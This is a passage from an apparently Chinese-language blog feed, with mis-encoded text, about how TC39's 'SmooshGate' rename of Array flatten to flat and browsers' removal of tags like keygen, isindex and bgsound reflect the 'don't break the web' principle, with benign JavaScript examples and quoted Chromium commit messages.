é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Sketch, Prototyping, Wireframe, Mockup</tag>
      </tags>
  </entry>
  <entry>
    <title>Donâ€™t break the Webï¼šä»¥ SmooshGate ä»¥åŠ keygen ç‚ºä¾‹</title>
    <url>/2019/11/30/smooshgate-and-keygen/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘ YDKJSï¼ˆYou Donâ€™t Know JS çš„ç¸®å¯«ï¼Œä¸­è­¯ç‰ˆç¿»æˆï¼šä½ æ‰€ä¸çŸ¥é“çš„JSï¼‰æœ‰äº†ç¬¬äºŒç‰ˆï¼Œåå« YDKJSYï¼ŒY æ˜¯ Yet çš„æ„æ€ï¼ˆä¸­æ–‡ç‰ˆå¯èƒ½å¯ä»¥ç¿»å«ï¼šä½ é‚„æ˜¯ä¸çŸ¥é“çš„ JSï¼‰ã€‚é€™å€‹ç¬¬äºŒç‰ˆé‚„æ²’å…¨éƒ¨å®Œæˆï¼Œä½†åœ¨ GitHub ä¸Šé¢å·²ç¶“å…¬é–‹äº†æœ€å‰é¢çš„ä¸€äº›ç« ç¯€ã€‚
æ¶å…ˆè®€äº†ä¸€ä¸‹ç¬¬ä¸€ç« ï¼Œåœ¨è¬›èˆ‡ JS ç›¸é—œçš„æ­·å²ï¼Œå…¶ä¸­æåˆ°ä¸€æ®µè®“æˆ‘å¾ˆæ„Ÿèˆˆè¶£çš„è­°é¡Œï¼š

 As such, sometimes the JS engines will refuse to conform to a specification-dictated change because it would break that web content.


In these cases, often TC39 will backtrack and simply choose to conform the specification to the reality of the web. For example, TC39 planned to add a contains(..) method for Arrays, but it was found that this name conflicted with old JS frameworks still in use on some sites, so they changed the name to a non-conflicting includes(..). The same happened with a comedic&#x2F;tragic JS community crisis dubbed â€œsmooshgateâ€, where the planned flatten(..) method was eventually renamed flat(..).

å¤§æ„æ˜¯åœ¨èªªæœ‰æ™‚å€™ JS çš„è¦æ ¼å¿…é ˆè·Ÿç¾å¯¦ï¼ˆå·²ç¶“å­˜åœ¨çš„é‚£äº›èˆŠçš„å¯¦ä½œï¼‰å¦¥å”ã€‚ä¾‹å¦‚èªªåŸæœ¬ Array è¦åŠ ä¸Šä¸€å€‹å«åš contains çš„ methodï¼Œä½†å› ç‚ºæœƒæœ‰å•é¡Œæ‰€ä»¥æ”¹å« includesï¼Œflatten ä¹Ÿæ”¹åå«åš flatã€‚
é‚„æœ‰ä¸€å€‹ä¸Šé¢ç‰¹åˆ¥æ¨™èµ·ä¾†çš„è©ã€Œsmooshgateã€ï¼Œç”¨é€™å€‹ç•¶é—œéµå­—å»æ‰¾æ‰ç™¼ç¾æ˜¯å»å¹´ä¸‰æœˆå·¦å³ç™¼ç”Ÿçš„äº‹ä»¶ï¼Œè‡³æ–¼ç™¼ç”Ÿäº†ä»€éº¼ï¼Œåº•ä¸‹æœƒè©³è¿°ï¼Œè·Ÿä¸Šé¢æçš„ flatten æœ‰é—œã€‚çœ‹åˆ°æœ‰é€™ä»¶äº‹çš„æ™‚å€™æˆ‘ç¬¬ä¸€å€‹åæ‡‰æ˜¯ï¼šã€Œå’¦ï¼Œæˆ‘æ€éº¼ä»€éº¼éƒ½ä¸çŸ¥é“ï¼Ÿã€ï¼ŒæŸ¥äº†ä¸€ä¸‹ç¹é«”ä¸­æ–‡çš„è³‡æ–™ï¼Œå¤§æ¦‚ä¹Ÿåªæœ‰é€™ç¯‡æœ‰æåˆ°ï¼šSmooshGateï¼Œä»¥åŠ[ç­†è¨˜] 3 ç¨® JavaScript ç‰©ä»¶å±¬æ€§çš„ç‰¹æ€§é€™ç¯‡æœ‰æ“¦åˆ°é‚Šè€Œå·²ã€‚
åœ¨ä»”ç´°ç ”ç©¶äº†ä¸€ä¸‹äº‹æƒ…çš„ä¾†é¾å»è„ˆä¹‹å¾Œï¼Œè¦ºå¾—æ˜¯å€‹æ»¿æœ‰è¶£çš„è­°é¡Œï¼Œå› æ­¤å¯«äº†é€™ç¯‡è·Ÿå¤§å®¶åˆ†äº«ã€‚


SmooshGate äº‹ä»¶æœ‰é—œé€™å€‹äº‹ä»¶ä»¥åŠé€™ç¯‡æ–‡ç« çš„éˆæ„Ÿï¼Œå¤§å¤šæ•¸ä¾†è‡ªæ–¼ï¼š#SmooshGate FAQ é€™ç¯‡æ–‡ç« ï¼Œè£¡é¢å…¶å¯¦è§£é‡‹å¾—å¾ˆå¥½ï¼Œå»ºè­°å¤§å®¶å¯ä»¥å»çœ‹é€™ç¯‡ã€‚
ä½†æ‡¶å¾—çœ‹ä¹Ÿæ²’é—œä¿‚ï¼Œåº•ä¸‹æˆ‘ç°¡å–®è¬›ä¸€ä¸‹äº‹æƒ…çš„ä¾†é¾å»è„ˆã€‚
æœ‰ä¸€å€‹çµ„ç¹”å«åš TC39ï¼Œå…¨åç‚º Technical Committee 39ï¼Œç¬¬ 39 è™ŸæŠ€è¡“å§”å“¡æœƒï¼Œè² è²¬èˆ‡ ECMAScript è¦ç¯„ç›¸é—œçš„äº‹é …ï¼Œä¾‹å¦‚èªªæ±ºå®šå“ªäº›ææ¡ˆå¯ä»¥éé—œä¹‹é¡çš„ï¼Œè€Œæœ€å¾Œé‚£äº›ææ¡ˆå°±æœƒè¢«ç´å…¥æ–°çš„ ECMAScript æ¨™æº–ä¹‹ä¸­ã€‚
ææ¡ˆä¸€å…±åˆ†æˆäº”å€‹ stageï¼Œå¾ stage0 åˆ° stage4ï¼Œè©³æƒ…æˆ‘å°±ä¸å¤šèªªæ˜äº†ï¼Œå¯ä»¥åƒè€ƒ Championing a proposal at TC39 æˆ–æ˜¯ The TC39 Processã€‚
TC39 ä¹‹å‰æœ‰ä¸€å€‹ææ¡ˆæ˜¯ Array.prototype.{flatten,flatMap}ï¼ˆflatten ç¾åœ¨å·²ç¶“æ”¹ç‚º flatï¼‰ã€‚
é€™é‚Šå…ˆå¹«ä¸æ¸…æ¥šä»€éº¼æ˜¯ flatten çš„è®€è€…ç°¡å–®ä»‹ç´¹ä¸€ä¸‹å®ƒçš„åŠŸç”¨ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠå·¢ç‹€çš„æ±è¥¿æ”¤å¹³ã€‚
ä¾‹å¦‚èªªåº•ä¸‹ç¯„ä¾‹ï¼š
let arr = [1, 2, [3], [4], [5, 6, 7]]console.log(arr.flatten()) // [1, 2, 3, 4, 5, 6, 7]

åŸæœ¬å·¢ç‹€çš„é™£åˆ—æœƒè¢«æ”¤å¹³ï¼Œé€™å°±æ˜¯ flatten çš„æ„æ€ï¼Œè·Ÿ lodash è£¡é¢çš„ flatten æ˜¯å·®ä¸å¤šçš„ã€‚
è©³ç´°çš„ä½¿ç”¨æ–¹æ³•å¯ä»¥åƒè€ƒ MDNï¼Œå°±åªæ˜¯å¤šäº†ä¸€å€‹åƒæ•¸ depth å¯ä»¥è®“ä½ æŒ‡å®šå±•é–‹çš„æ·±åº¦ã€‚
è€Œ flatMap å°±æ˜¯å…ˆ map ä¹‹å¾Œå† flatï¼Œç†Ÿæ‚‰ RxJS çš„æœ‹å‹å€‘æ‡‰è©²æœƒæ„Ÿåˆ°æ»¿è¦ªåˆ‡çš„ï¼ˆåœ¨ RxJS è£¡é¢åˆç¨±ä½œ mergeMapï¼Œè€Œä¸” mergeMap æ¯”è¼ƒå¸¸ç”¨ï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹ä¹Ÿå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šconcatAll and concatMap rather than flatten and flatMapï¼‰ã€‚
å¥½ï¼Œé€™å€‹ææ¡ˆçœ‹ä¼¼å¾ˆä¸éŒ¯ï¼Œä½†åˆ°åº•æœƒæœ‰ä»€éº¼å•é¡Œå‘¢ï¼Ÿ
å•é¡Œå°±å‡ºåœ¨ä¸€å€‹å‰ç«¯æ–°é®®äººå¯èƒ½æ²’è½éçš„å·¥å…·ï¼šMooToolsï¼Œè€Œæˆ‘ä¹Ÿåªæœ‰è½éè€Œå·²ï¼Œå®Œå…¨æ²’ç”¨éã€‚æƒ³è¦å¿«é€ŸçŸ¥é“å®ƒå¯ä»¥å¹¹å˜›çš„ï¼Œè«‹çœ‹é€™ç¯‡åå¹´å‰çš„æ¯”è¼ƒæ–‡ï¼šjQuery vs MooToolsã€‚
åœ¨ MooTools è£¡é¢ï¼Œä»–å€‘å®šç¾©äº†è‡ªå·±çš„ flatten methodï¼Œåœ¨ code è£¡é¢åšäº†é¡ä¼¼ä¸‹é¢çš„äº‹ï¼š
Array.prototype.flatten = /* ... */;

é€™è½èµ·ä¾†æ²’ä»€éº¼å•é¡Œï¼Œå› ç‚ºå°±ç®— flatten æ­£å¼åˆ—å…¥æ¨™æº–ä¸¦ä¸”è®ŠæˆåŸç”Ÿçš„ methodï¼Œä¹Ÿåªæ˜¯æŠŠå®ƒè¦†è“‹æ‰è€Œå·²ï¼Œæ²’äº‹å…’æ²’äº‹å…’ã€‚
ä½†éº»ç…©çš„äº‹æƒ…æ˜¯ï¼ŒMooTools é‚„æœ‰ä¸€æ®µ code æ˜¯æŠŠ Array çš„ method éƒ½è¤‡è£½åˆ° Elementsï¼ˆMooTools è‡ªå®šç¾©çš„ APIï¼‰ä¸Šé¢å»ï¼š
for (var key in Array.prototype) &#123;  Elements.prototype[key] = Array.prototype[key];&#125;

forâ€¦in é€™å€‹èªæ³•æœƒéæ­·æ‰€æœ‰å¯åˆ—èˆ‰çš„ï¼ˆenumerableï¼‰å±¬æ€§ï¼Œè€ŒåŸç”Ÿçš„ method ä¸¦ä¸åŒ…å«åœ¨è£¡é¢ã€‚
ä¾‹å¦‚èªªåœ¨ Chrome devtool çš„ console åŸ·è¡Œä»¥ä¸‹é€™æ®µ codeï¼š
for (var key in Array.prototype) &#123;  console.log(key)&#125;

æœƒç™¼ç¾ä»€éº¼éƒ½æ²’æœ‰å°å‡ºä¾†ã€‚
ä½†å¦‚æœä½ åŠ ä¸Šäº†å¹¾å€‹è‡ªå®šç¾©çš„å±¬æ€§ä¹‹å¾Œï¼š
Array.prototype.foo = 123Array.prototype.sort = 456Array.prototype.you_can_see_me = 789for (var key in Array.prototype) &#123;  console.log(key) // foo, you_can_see_me&#125;

æœƒç™¼ç¾åªæœ‰è‡ªå®šç¾©çš„å±¬æ€§æœƒæ˜¯ enumerable çš„ï¼Œè€ŒåŸç”Ÿçš„æ–¹æ³•ä½ å°±ç®—è¦†å¯«ï¼Œä¹Ÿé‚„æ˜¯ä¸æœƒè®Šæˆ enumerableã€‚
é‚£å•é¡Œæ˜¯ä»€éº¼å‘¢ï¼Ÿå•é¡Œå°±å‡ºåœ¨ç•¶ flatten é‚„æ²’æ­£å¼è®Šæˆ Array çš„ method æ™‚ï¼Œå®ƒå°±åªæ˜¯ä¸€å€‹ MooTools è‡ªå®šç¾©çš„å±¬æ€§ï¼Œæ˜¯ enumerable çš„ï¼Œæ‰€ä»¥æœƒè¢«è¤‡è£½åˆ° Elements å»ã€‚ä½†æ˜¯ç•¶ flatten ç´å…¥æ¨™æº–ä¸¦ä¸”è¢«ç€è¦½å™¨æ­£å¼æ”¯æ´ä»¥å¾Œï¼Œflatten å°±ä¸æ˜¯ enumerable çš„äº†ã€‚
æ„æ€å°±æ˜¯ï¼ŒElements.prototype.flatten å°±æœƒè®Šæˆ undefinedï¼Œæ‰€æœ‰ä½¿ç”¨åˆ°é€™å€‹ method çš„ code éƒ½æœƒæ›æ‰ã€‚
æ­¤æ™‚å¤©çœŸçš„ä½ å¯èƒ½æœƒæƒ³èªªï¼šã€Œé‚£å°±æŠŠ flatten è®Šæˆ enumerable çš„å§ï¼ã€ï¼Œä½†é€™æ¨£æä¸å¥½æœƒç”¢ç”Ÿæ›´å¤šå•é¡Œï¼Œå› ç‚ºä¸€å †èˆŠçš„ forâ€¦in å°±æœƒçªç„¶å¤šå‡ºä¸€å€‹ flatten çš„å±¬æ€§ï¼Œå¾ˆæœ‰å¯èƒ½æœƒé€ æˆå…¶ä»–çš„ bugã€‚
ç•¶åˆç™¼ç¾é€™å€‹ bug çš„è¨è«–ä¸²å¯ä»¥çœ‹é€™è£¡ï¼šImplementing array.prototype.flatten broke MooToolsâ€™ version of it.
ç¢ºèªæœ‰äº†é€™å€‹å•é¡Œä»¥å¾Œï¼Œå¤§å®¶å°±é–‹å§‹è¨è«–è¦æŠŠ flatten æ›æˆä»€éº¼è©ï¼Œæœ‰äººåœ¨ Issues è£¡é¢æè­°èªªï¼šrename flatten to smooshï¼Œå¼•èµ·äº†å»£å¤§è¨è«–ï¼Œä¹Ÿå°±æ˜¯ #SmooshGate äº‹ä»¶çš„èµ·æºã€‚é™¤äº†è¨è«–æ”¹åä»¥å¤–ï¼Œä¹Ÿæœ‰äººèªç‚ºä¹¾è„†å°±è®“é‚£äº›ç¶²ç«™å£æ‰å¥½äº†ã€‚
smoosh é€™å€‹å­—å…¶å¯¦è·Ÿ flatten æˆ–æ˜¯å…¶ä»–äººæè­°çš„ squash å·®ä¸å¤šï¼Œéƒ½æœ‰æŠŠæ±è¥¿å¼„å¹³çš„æ„æ€åœ¨ï¼Œä¸éé€™å€‹å­—å¯¦åœ¨æ˜¯éå¸¸å°‘è¦‹ï¼Œè½åˆ°é€™äº‹ä»¶ä»¥å‰æˆ‘ä¹Ÿå®Œå…¨æ²’è½éé€™å€‹å–®å­—ã€‚ä¸éé€™å€‹æè­°å…¶å¯¦å¾ä¾†æ²’æœ‰æ­£å¼è¢« TC39 è¨è«–éå°±æ˜¯äº†ã€‚
TC39 åœ¨ 2018 å¹´ 5 æœˆçš„æœƒè­°ä¸Šï¼Œæ­£å¼æŠŠ flatten æ”¹æˆ flatï¼ŒçµæŸäº†é€™å€‹äº‹ä»¶ã€‚
é€™å€‹ææ¡ˆçš„æ™‚é–“è»¸å¤§æ¦‚æ˜¯é€™æ¨£ï¼š

2017 å¹´ 7 æœˆï¼šstage 0
2017 å¹´ 7 æœˆï¼šstage 1
2017 å¹´ 9 æœˆï¼šstage 2
2017 å¹´ 11 æœˆï¼šstage 3
2018 å¹´ 3 æœˆï¼šç™¼ç¾ flatten æœƒè®“ MooTools å£æ‰
2018 å¹´ 3 æœˆï¼šæœ‰äººæè­°æ”¹åç‚º smoosh
2018 å¹´ 5 æœˆï¼šflatten æ”¹åç‚º flat
2019 å¹´ 1 æœˆï¼šstage 4

æˆ‘å› ç‚ºå¥½å¥‡å»æ‰¾äº† V8 çš„ commit ä¾†çœ‹ï¼ŒV8 æ˜¯åœ¨ 2018 å¹´ 3 æœˆçš„æ™‚å€™å¯¦ä½œé€™å€‹åŠŸèƒ½çš„ï¼š[esnext] Implement Array.prototype.{flatten,flatMap}ï¼Œå…¶ä¸­æˆ‘è¦ºå¾—æœ€å€¼å¾—å¤§å®¶å­¸ç¿’çš„å…¶å¯¦æ˜¯æ¸¬è©¦çš„éƒ¨åˆ†ï¼š
const elements = new Set([  -Infinity,  -1,  -0,  +0,  +1,  Infinity,  null,  undefined,  true,  false,  &#x27;&#x27;,  &#x27;foo&#x27;,  /./,  [],  &#123;&#125;,  Object.create(null),  new Proxy(&#123;&#125;, &#123;&#125;),  Symbol(),  x =&gt; x ** 2,  String]);  for (const value of elements) &#123;  assertEquals(    [value].flatMap((element) =&gt; [element, element]),    [value, value]  );&#125;

ç›´æ¥ä¸Ÿäº†å„ç¨®å¥‡å½¢æ€ªç‹€çš„æ±è¥¿é€²å»æ¸¬ã€‚
åœ¨ flatten æ”¹åç‚º flat çš„éš”å¤©ï¼ŒV8 ä¹Ÿç«‹åˆ»åšå‡ºä¿®æ­£ï¼š[esnext] Rename Array#flatten to flatã€‚
ç°¡å–®ç¸½çµä¸€ä¸‹ï¼Œç¸½ä¹‹ #SmooshGate äº‹ä»¶å°±æ˜¯ï¼š

æœ‰äººæè­°æ–°çš„ methodï¼šArray.prototype.flatten
ç™¼ç¾æœƒè®“ MooTools å£æ‰ï¼Œå› æ­¤è¦æ”¹å
æœ‰äººæè­°æ”¹å smooshï¼Œä¹Ÿæœ‰äººè¦ºå¾—ä¸è©²æ”¹åï¼Œå¼•èµ·ä¸€ç•ªè¨è«–
TC39 æ±ºè­°æ”¹æˆ flatï¼Œäº‹æƒ…è½å¹•

å…¶ä¸­çš„ç¬¬äºŒé»å¯èƒ½æœ‰äº›äººæœƒå¾ˆç–‘æƒ‘ï¼Œæƒ³èªª MooTools éƒ½æ˜¯é€™éº¼å¤æ—©çš„æ±è¥¿äº†ï¼Œç‚ºä»€éº¼ä¸ç›´æ¥è®“å®ƒå£æ‰å°±å¥½ï¼Œåæ­£éƒ½æ˜¯ä¸€äº›è€èˆŠçš„ç¶²ç«™äº†ã€‚
é€™å°±è¦è«‡è«–åˆ°åˆ¶å®š Web ç›¸é—œæ¨™æº–æ™‚çš„åŸå‰‡äº†ï¼šDonâ€™t break the webã€‚
Donâ€™t break the Webé€™å€‹ç¶²ç«™ï¼šSpace Jam éäº† 22 å¹´ï¼Œä¾èˆŠå¯ä»¥é †åˆ©åŸ·è¡Œï¼Œå°±æ˜¯å› ç‚ºåœ¨åˆ¶å®šç¶²é ç›¸é—œæ–°æ¨™æº–æ™‚éƒ½æœƒæ³¨æ„åˆ°ã€ŒDonâ€™t break the Webã€é€™å€‹å¤§åŸå‰‡ã€‚
ä»”ç´°æƒ³æƒ³ï¼Œå¥½åƒæœƒç™¼ç¾ Web çš„é ˜åŸŸæ²’æœ‰ä»€éº¼ breaking changeï¼Œä½ ä»¥å‰å¯ä»¥ç”¨çš„ JS èªæ³•ç¾åœ¨é‚„æ˜¯å¯ä»¥ç”¨ï¼Œåªæ˜¯å¤šäº†ä¸€äº›æ–°çš„æ±è¥¿ï¼Œè€Œä¸æ˜¯æŠŠèˆŠçš„æ±è¥¿æ”¹æ‰æˆ–è€…æ˜¯æ‹¿æ‰ã€‚
å› ç‚ºä¸€æ—¦å‡ºç¾ breaking changeï¼Œå°±å¯èƒ½æœƒæœ‰ç¶²ç«™é­æ®ƒï¼Œåƒæ˜¯å‡ºç¾ bug ç”šè‡³æ˜¯æ•´å€‹å£æ‰ã€‚å…¶å¯¦æœ‰å¾ˆå¤šç¶²ç«™å¥½å¹¾å¹´éƒ½æ²’æœ‰åœ¨ç¶­è­·äº†ï¼Œä½†æˆ‘å€‘ä¹Ÿä¸æ‡‰è©²è®“å®ƒå°±é€™æ¨£å£æ‰ã€‚å¦‚æœä»Šå¤©åˆ¶å®šæ–°æ¨™æº–æ™‚æœ‰äº† breaking changeï¼Œæœ€å¾Œåƒè™§çš„é‚„æ˜¯ä½¿ç”¨è€…ï¼Œä½¿ç”¨è€…åªæœƒçŸ¥é“ç¶²ç«™å£äº†ï¼Œå»ä¸çŸ¥é“æ˜¯ç‚ºä»€éº¼å£æ‰ã€‚
æ‰€ä»¥åœ¨ SmooshGate äº‹ä»¶çš„é¸æ“‡ä¸Šï¼Œæ¯”èµ·ã€Œflatten å°±æ˜¯æœ€ç¬¦åˆèªç¾©ï¼Œè®“é‚£äº›ä½¿ç”¨ MooTools çš„è€èˆŠç¶²ç«™å£æ‰æœ‰ä»€éº¼é—œä¿‚ï¼ã€ï¼ŒTC39 æœ€çµ‚é¸æ“‡äº†ã€ŒæŠŠ flatten æ”¹ä¸€ä¸‹åå­—å°±å¥½ï¼Œé›–ç„¶ä¸æ˜¯æœ€ç†æƒ³çš„å‘½åï¼Œä½†æˆ‘å€‘ä¸èƒ½è®“é‚£äº›ç¶²é å£æ‰ã€ã€‚
ä¸éè©±é›–å¦‚æ­¤ï¼Œé€™ä¸ä»£è¡¨ç³Ÿç³•çš„è¨­è¨ˆä¸€æ—¦å‡ºç¾ä»¥å¾Œï¼Œå°±å®Œå…¨æ²’æœ‰è¾¦æ³•è¢«ç§»é™¤ã€‚
äº‹å¯¦ä¸Šï¼Œæœ‰äº›æ±è¥¿å°±æ‚„æ‚„åœ°è¢«ç§»é™¤æ‰äº†ï¼Œä½†å› ç‚ºé€™äº›æ±è¥¿å¤ªéå†·é–€æ‰€ä»¥ä½ æˆ‘å¯èƒ½éƒ½æ²’æ³¨æ„åˆ°ã€‚
WHATWG çš„ FAQ æœ‰å¯«åˆ°ï¼š

That said, we do sometimes remove things from the platform! This is usually a very tricky effort, involving the coordination among multiple implementations and extensive telemetry to quantify how many web pages would have their behavior changed. But when the feature is sufficiently insecure, harmful to users, or is used very rarely, this can be done. And once implementers have agreed to remove the feature from their browsers, we can work together to remove it from the standard.

åº•ä¸‹æœ‰æåˆ°äº†å…©å€‹ç¯„ä¾‹ï¼š&lt;applet&gt; èˆ‡ &lt;keygen&gt;ã€‚
ä¹Ÿæ˜¯å› ç‚ºå¥½å¥‡ï¼Œæ‰€ä»¥æˆ‘åˆå»æ‰¾äº†ä¸€äº›ç›¸é—œè³‡æ–™ä¾†çœ‹ã€‚
è¢«æ·˜æ±°çš„ HTML æ¨™ç±¤æœ‰è½é&lt;keygen&gt;é€™å€‹æ¨™ç±¤çš„è«‹èˆ‰æ‰‹ä¸€ä¸‹ï¼Ÿèˆ‰æ‰‹çš„äººéº»ç…©å¤§å®¶å¹«ä»–å€‘é¼“é¼“æŒï¼Œä½ å¾ˆå²å®³ï¼Œå°ä½ ç‚ºå†·é–€ HTML æ¨™ç±¤ä¹‹ç‹ã€‚
æˆ‘å°±ç®—çœ‹äº† MDN ä¸Šé¢çš„ç¯„ä¾‹ï¼Œä¹Ÿæ²’æœ‰å¾ˆæ¸…æ¥šé€™å€‹æ¨™ç±¤åœ¨å¹¹å˜›ã€‚åªçŸ¥é“é€™æ˜¯ä¸€å€‹å¯ä»¥ç”¨åœ¨è¡¨å–®è£¡çš„æ¨™ç±¤ï¼Œäººå¦‚å…¶åï¼Œæ˜¯ç”¨ä¾†ç”¢ç”Ÿèˆ‡æ†‘è­‰ç›¸é—œçš„ key ç”¨çš„ã€‚
å¾ MDN çµ¦çš„è³‡æ–™ Non-conforming features è£¡é¢ï¼Œæˆ‘å€‘å¯ä»¥é€²ä¸€æ­¥æ‰¾åˆ°å…¶ä»–ä¹Ÿè¢«æ·˜æ±°çš„æ¨™ç±¤ï¼Œä¾‹å¦‚èªªï¼š

applet
acronym
bgsound
dir
isindex
keygen
nextid

ä¸éè¢«æ¨™ç¤ºç‚º obsolete ä¸ä»£è¡¨å°±æ²’æœ‰ä½œç”¨ï¼Œæ‡‰è©²åªæ˜¯èªªæ˜ä½ ä¸è©²å†ä½¿ç”¨é€™äº›æ¨™ç±¤ï¼Œå› ç‚ºæˆ‘çŒœæ ¹æ“š donâ€™t break the web çš„åŸå‰‡ï¼Œè£¡é¢æœ‰äº›æ¨™ç±¤é‚„æ˜¯å¯ä»¥æ­£å¸¸é‹ä½œï¼Œä¾‹å¦‚èªªå°æ™‚å€™å¾ˆæ„›ç”¨çš„è·‘é¦¬ç‡ˆ marquee ä¹Ÿåœ¨ Non-conforming features è£¡é¢ã€‚ 
åœ¨å¦å¤–ä¸€ä»½ DOM ç›¸é—œçš„æ¨™æº–ç•¶ä¸­ï¼Œæœ‰èªªæ˜äº†è©²å¦‚ä½•è™•ç† HTML çš„ tagï¼Œæˆ‘çŒœé€™äº›æ‰æ˜¯çœŸçš„è¢«æ·˜æ±°è€Œä¸”æ²’ä½œç”¨çš„æ¨™ç±¤ï¼š

If name is applet, bgsound, blink, isindex, keygen, multicol, nextid, or spacer, then return HTMLUnknownElement.

å¦‚æœä½ æ‹¿é€™äº›æ¨™ç±¤åˆ° Chrome ä¸Šé¢å»è©¦ï¼Œä¾‹å¦‚èªªé€™æ¨£ï¼š
&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;bgsound&gt;123&lt;/bgsound&gt;    &lt;isindex&gt;123&lt;/isindex&gt;    &lt;multicol&gt;123&lt;/multicol&gt;    &lt;foo&gt;123&lt;/foo&gt;  &lt;/body&gt;&lt;/html&gt;

å°±æœƒç™¼ç¾è¡¨ç¾èµ·ä¾†è·Ÿ&lt;span&gt;å·®ä¸å¤šï¼ŒçŒœæ¸¬ Chrome æ‡‰è©²æœƒæŠŠé€™äº›ä¸èªè­˜çš„ tag ç•¶ä½œ span ä¾†çœ‹å¾…ã€‚
å†ä¾†å› ç‚ºå¥½å¥‡ï¼Œæ‰€ä»¥ä¹Ÿå»æ‰¾äº†ä¸€ä¸‹ chromium è£¡ç›¸é—œçš„ç¨‹å¼ç¢¼ï¼Œæˆ‘ä»¥å‰éƒ½æ˜¯ç›´æ¥åœ¨ GitHub ä¸Šé¢å»æœå°‹ code çš„å…§å®¹ï¼Œä½†å› ç‚ºé€™æ¬¡è¦æœçš„é—œéµå­—é‡è¤‡æ€§å¤ªé«˜ï¼Œå› æ­¤æ”¹æˆæœ commit messageã€‚é€™å€‹æ™‚å€™å°±å®Œå…¨çªé¡¯ commit message çš„é‡è¦æ€§äº†ï¼Œç™¼ç¾ chromium çš„ commit message å¯«å¾—æ»¿å¥½çš„ã€‚
ä¾‹å¦‚èªªé€™å€‹ commitï¼šRemove support for the obsolete  tag.
This patch removes all special-casing for the &lt;isindex&gt; tag; itnow behaves exactly like &lt;foo&gt; in all respects. This additionallymeans that we can remove the special-casing for forms containing&lt;input name=&quot;isindex&quot;&gt; as their first element.  The various tests for &lt;isindex&gt; have been deleted, with theexception of the imported HTML5Lib tests. It&#x27;s not clear thatwe should send them patches to remove the &lt;isindex&gt; tests, atleast not while the element is (an obsolete) part of HTML5, andsupported by other vendors.  I&#x27;ve just landed failing test results here. That seems likethe right thing to do.  &quot;Intent to Remove&quot; discussion: https://groups.google.com/a/chromium.org/d/msg/blink-dev/14q_I06gwg8/0a3JI0kjbC0J

æœ‰é™„ä¸Šç•¶åˆçš„è¨è«–ä¸²ï¼Œè³‡è¨Šçµ¦çš„å¾ˆè©³ç´°ã€‚è€Œ code çš„æ”¹å‹•é™¤äº†æ¸¬è©¦çš„éƒ¨åˆ†ä»¥å¤–ï¼Œå°±æ˜¯æŠŠæœ‰é—œé€™å€‹ tag çš„åœ°æ–¹éƒ½åˆªæ‰ï¼Œç•¶ä½œæ˜¯ä¸€å€‹ä¸èªè­˜çš„ tagï¼Œæ‰€ä»¥ message æ‰æœƒèªªï¼šã€Œit now behaves exactly like &lt;foo&gt; in all respects.ã€
å†ä¾†æˆ‘å€‘çœ‹å¦å¤–ä¸€å€‹ commitï¼šRemove support for the keygen tag
This removes support for &lt;keygen&gt; by updating itto be an HTMLUnknownElement. As a result, it&#x27;sno longer a form-associated element and nolonger has IDL-assigned properties.  The &lt;keygen&gt; tag is still left in the parser,similar to &lt;applet&gt;, so that it maintains thedocument parse behaviours (such as self-closing),but is otherwise a neutered element.  Tests that were relying on &lt;keygen&gt; having itsown browser-created shadow root (for its customselect element) have been updated to useprogress bars, while other tests (such as&lt;keygen&gt;-related crash tests) have beenfully removed.  As Blink no longer treats this tag as special,all the related IPC infrastructure is removed,including preferences and enterprise flags,and all localized strings, as they&#x27;re all nowunreachable.  This concludes the &quot;Intent to Remove&quot; threadfor &lt;keygen&gt; athttps://groups.google.com/a/chromium.org/d/msg/blink-dev/z_qEpmzzKh8/BH-lkwdgBAAJ

å› ç‚º&lt;keygen&gt;é€™å€‹ tag åŸæœ¬çš„è™•ç†å°±æ¯”è¼ƒè¤‡é›œï¼Œæ¯”èµ·å‰›å‰›çš„&lt;isindex&gt;ï¼Œæ”¹å‹•çš„æª”æ¡ˆå¤šäº†å¾ˆå¤šï¼Œçœ‹èµ·ä¾†æ˜¯æŠŠç›¸é—œçš„æ±è¥¿å…¨éƒ¨éƒ½æ‹¿æ‰äº†ã€‚
æœ€å¾Œä¾†çœ‹é€™ä¸€å€‹ï¼šbgsound must use the HTMLUnknownElement interface
As specified here:https://html.spec.whatwg.org/#bgsound  This causes one less fail on:http://w3c-test.org/html/semantics/interfaces.html

è£¡é¢çµ¦çš„æ¸¬è©¦é€£çµï¼šTest of interfaces æ»¿æœ‰è¶£çš„ï¼Œæœƒå»æ¸¬è©¦ä¸€å¤§å †å…ƒç´ çš„ interface æ˜¯ä¸æ˜¯æ­£ç¢ºçš„ï¼Œåœ¨ interfaces.js è£¡é¢å¯ä»¥çœ‹åˆ°å®ƒæ¸¬è©¦çš„åˆ—è¡¨ï¼š
var elements = [  [&quot;a&quot;, &quot;Anchor&quot;],  [&quot;abbr&quot;, &quot;&quot;],  [&quot;acronym&quot;, &quot;&quot;],  [&quot;address&quot;, &quot;&quot;],  [&quot;applet&quot;, &quot;Unknown&quot;],  [&quot;area&quot;, &quot;Area&quot;],  [&quot;article&quot;, &quot;&quot;],  [&quot;aside&quot;, &quot;&quot;],  [&quot;audio&quot;, &quot;Audio&quot;],  [&quot;b&quot;, &quot;&quot;],  [&quot;base&quot;, &quot;Base&quot;],  [&quot;basefont&quot;, &quot;&quot;],  [&quot;bdi&quot;, &quot;&quot;],  [&quot;bdo&quot;, &quot;&quot;],  [&quot;bgsound&quot;, &quot;Unknown&quot;],  [&quot;big&quot;, &quot;&quot;],  [&quot;blink&quot;, &quot;Unknown&quot;],  [&quot;blockquote&quot;, &quot;Quote&quot;],  [&quot;body&quot;, &quot;Body&quot;],  [&quot;br&quot;, &quot;BR&quot;],  [&quot;button&quot;, &quot;Button&quot;],  [&quot;canvas&quot;, &quot;Canvas&quot;],  [&quot;caption&quot;, &quot;TableCaption&quot;],  